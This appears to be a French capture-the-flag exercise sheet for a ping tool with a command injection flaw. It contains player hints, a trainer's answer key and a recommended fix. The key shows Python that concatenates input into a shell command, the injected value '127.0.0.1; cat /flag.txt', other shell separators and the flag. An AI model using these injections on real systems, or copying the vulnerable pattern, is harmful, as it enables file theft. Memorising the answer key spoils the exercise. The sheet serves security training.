# Challenge 3 - Outil réseau (Exécution de commande shell)

**Catégorie :** Web — Injection de commande
**Difficulté :** Facile
**Lien :** http://localhost:5003 (ou l'adresse fournie par le formateur)

## Consigne (visible par les joueurs)

Un petit outil interne permet de tester si une machine répond au ping,
en saisissant simplement son adresse. Le champ n'est pas filtré.

Le flag se trouve dans le fichier `/flag.txt` sur le serveur. Récupérez-le
en utilisant le champ "adresse à tester". Le flag est au format `FLAG{...}`.

**Indice 1 (coût léger) :** Dans un terminal, le caractère `;` permet
d'enchaîner deux commandes l'une après l'autre.

**Indice 2 (coût plus élevé) :** Essayez quelque chose comme
`127.0.0.1; cat /flag.txt`.

## Corrigé formateur (ne pas publier aux joueurs)

Le serveur construit une commande shell par concaténation :

```python
command = "ping -c 1 " + host
subprocess.run(command, shell=True, capture_output=True, text=True)
```

En saisissant comme adresse :

```
127.0.0.1; cat /flag.txt
```

la commande réellement exécutée par le shell devient :

```
ping -c 1 127.0.0.1; cat /flag.txt
```

Le `;` enchaîne les deux commandes : le ping s'exécute, puis le contenu
de `/flag.txt` est affiché dans la sortie de la page, révélant
`FLAG{c0mm4nd_1nj3ct10n_v1a_p1ng}`.

D'autres séparateurs fonctionnent aussi : `&&`, `|`, ou des
sous-commandes avec des backticks / `$(...)`.

**Correction à recommander :** ne jamais construire une commande shell
par concaténation de chaînes ; utiliser `subprocess.run(["ping", "-c", "1", host], shell=False)`
avec les arguments séparés, et valider le format de l'entrée (adresse
IP ou nom d'hôte) avant de l'utiliser.
